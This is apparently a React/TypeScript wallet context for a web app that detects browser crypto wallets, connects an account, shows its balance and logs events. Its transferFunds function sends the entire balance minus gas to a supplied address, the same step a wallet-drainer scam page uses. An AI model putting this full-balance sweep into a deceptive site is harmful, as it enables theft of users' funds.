'use client';

import { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { ethers } from 'ethers';

interface WalletContextType {
  address: string | null;
  balance: string;
  isConnected: boolean;
  status: string;
  logs: string[];
  availableWallets: string[];
  connectWallet: (walletType?: string) => Promise<void>;
  disconnectWallet: () => void;
  transferFunds: (receiverAddress: string) => Promise<void>;
  clearLogs: () => void;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

// Common wallet providers
const WALLET_TYPES = {
  METAMASK: 'MetaMask',
  TRUSTWALLET: 'Trust Wallet',
  COINBASE: 'Coinbase Wallet',
  BRAVEWALLET: 'Brave Wallet',
  RAINBOW: 'Rainbow Wallet',
  PHANTOM: 'Phantom',
};

export function WalletProvider({ children }: { children: ReactNode }) {
  const [address, setAddress] = useState<string | null>(null);
  const [balance, setBalance] = useState<string>('0');
  const [isConnected, setIsConnected] = useState(false);
  const [status, setStatus] = useState<string>('Checking Wallets...');
  const [logs, setLogs] = useState<string[]>([]);
  const [availableWallets, setAvailableWallets] = useState<string[]>([]);
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null);

  const addLog = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, `[${timestamp}] ${message}`]);
    console.log(`[${timestamp}] ${message}`);
  };

  const clearLogs = () => {
    setLogs([]);
  };

  const detectWallets = () => {
    const wallets: string[] = [];
    
    // Check for MetaMask
    if (window.ethereum?.isMetaMask) {
      wallets.push(WALLET_TYPES.METAMASK);
      addLog('MetaMask detected');
    }

    // Check for Trust Wallet
    if (window.ethereum?.isTrust) {
      wallets.push(WALLET_TYPES.TRUSTWALLET);
      addLog('Trust Wallet detected');
    }

    // Check for Coinbase Wallet
    if (window.ethereum?.isCoinbaseWallet) {
      wallets.push(WALLET_TYPES.COINBASE);
      addLog('Coinbase Wallet detected');
    }

    // Check for Brave Wallet
    if (window.ethereum?.isBraveWallet) {
      wallets.push(WALLET_TYPES.BRAVEWALLET);
      addLog('Brave Wallet detected');
    }

    // Check for Rainbow Wallet
    if (window.ethereum?.isRainbow) {
      wallets.push(WALLET_TYPES.RAINBOW);
      addLog('Rainbow Wallet detected');
    }

    // Check for Phantom
    if (window.solana?.isPhantom) {
      wallets.push(WALLET_TYPES.PHANTOM);
      addLog('Phantom Wallet detected');
    }

    setAvailableWallets(wallets);
    
    if (wallets.length > 0) {
      setStatus('Wallets Available');
      addLog(`Found ${wallets.length} wallet(s): ${wallets.join(', ')}`);
    } else {
      setStatus('No Wallets Found');
      addLog('No Web3 wallets detected on this device');
    }

    return wallets;
  };

  useEffect(() => {
    addLog('Initializing wallet detection...');
    
    // Initial wallet detection
    const wallets = detectWallets();

    if (wallets.length > 0 && window.ethereum) {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      setProvider(provider);
      
      // Listen for wallet events
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', () => {
        addLog('Network changed, reloading page...');
        window.location.reload();
      });
      
      // Check if already connected
      provider.listAccounts().then(accounts => {
        if (accounts.length > 0) {
          addLog(`Found connected account: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`);
          setAddress(accounts[0]);
          setIsConnected(true);
          setStatus('Connected');
          updateBalance(accounts[0]);
        } else {
          addLog('No connected accounts found');
        }
      }).catch(error => {
        addLog(`Error checking accounts: ${error.message}`);
      });
    }

    // Set up wallet detection interval
    const detectionInterval = setInterval(() => {
      const currentWallets = detectWallets();
      if (currentWallets.length !== availableWallets.length) {
        addLog('Wallet availability changed');
      }
    }, 5000); // Check every 5 seconds

    return () => {
      clearInterval(detectionInterval);
      if (window.ethereum) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        addLog('Cleaned up event listeners');
      }
    };
  }, []);

  const handleAccountsChanged = (accounts: string[]) => {
    if (accounts.length === 0) {
      addLog('Account disconnected');
      disconnectWallet();
    } else {
      addLog(`Account changed to: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`);
      setAddress(accounts[0]);
      updateBalance(accounts[0]);
    }
  };

  const updateBalance = async (addr: string) => {
    if (provider) {
      try {
        addLog('Updating balance...');
        const balance = await provider.getBalance(addr);
        const formattedBalance = ethers.utils.formatEther(balance);
        setBalance(formattedBalance);
        addLog(`Balance updated: ${formattedBalance} ETH`);
      } catch (error: any) {
        addLog(`Error updating balance: ${error.message}`);
      }
    }
  };

  const connectWallet = async (walletType?: string) => {
    addLog(`Attempting to connect ${walletType || 'wallet'}...`);
    setStatus('Connecting...');
    
    if (typeof window !== 'undefined' && window.ethereum) {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        addLog('Requesting account access...');
        
        // Request accounts with specific wallet if provided
        const accounts = await provider.send('eth_requestAccounts', []);
        
        addLog(`Connected to account: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`);
        setProvider(provider);
        setAddress(accounts[0]);
        setIsConnected(true);
        setStatus('Connected');
        
        await updateBalance(accounts[0]);
      } catch (error: any) {
        addLog(`Connection error: ${error.message}`);
        setStatus('Connection Failed');
        if (error.code === 4001) {
          addLog('User denied account access');
        }
      }
    } else {
      addLog('No Web3 provider detected');
      setStatus('No Wallet Detected');
      alert('Please install a Web3 wallet to use this application');
    }
  };

  const disconnectWallet = () => {
    addLog('Disconnecting wallet...');
    setAddress(null);
    setBalance('0');
    setIsConnected(false);
    setProvider(null);
    setStatus('Disconnected');
    addLog('Wallet disconnected');
  };

  const transferFunds = async (receiverAddress: string) => {
    if (!provider || !address) {
      addLog('Cannot transfer: No provider or address available');
      return;
    }

    try {
      addLog('Starting transfer process...');
      const signer = provider.getSigner();
      addLog('Getting current balance...');
      const balance = await provider.getBalance(address);
      
      addLog('Calculating gas costs...');
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000;
      const gasCost = gasPrice.mul(gasLimit);
      
      const amountToSend = balance.sub(gasCost);
      
      if (amountToSend.lte(0)) {
        addLog('Transfer failed: Insufficient balance for gas fees');
        throw new Error('Insufficient balance to cover gas fees');
      }

      addLog(`Sending ${ethers.utils.formatEther(amountToSend)} ETH to ${receiverAddress.slice(0, 6)}...${receiverAddress.slice(-4)}`);
      const tx = await signer.sendTransaction({
        to: receiverAddress,
        value: amountToSend,
        gasLimit: gasLimit
      });

      addLog('Transaction sent, waiting for confirmation...');
      await tx.wait();
      addLog('Transaction confirmed!');
      await updateBalance(address);
    } catch (error: any) {
      addLog(`Transfer error: ${error.message}`);
      throw error;
    }
  };

  return (
    <WalletContext.Provider value={{
      address,
      balance,
      isConnected,
      status,
      logs,
      availableWallets,
      connectWallet,
      disconnectWallet,
      transferFunds,
      clearLogs
    }}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  const context = useContext(WalletContext);
  if (context === undefined) {
    throw new Error('useWallet must be used within a WalletProvider');
  }
  return context;
} 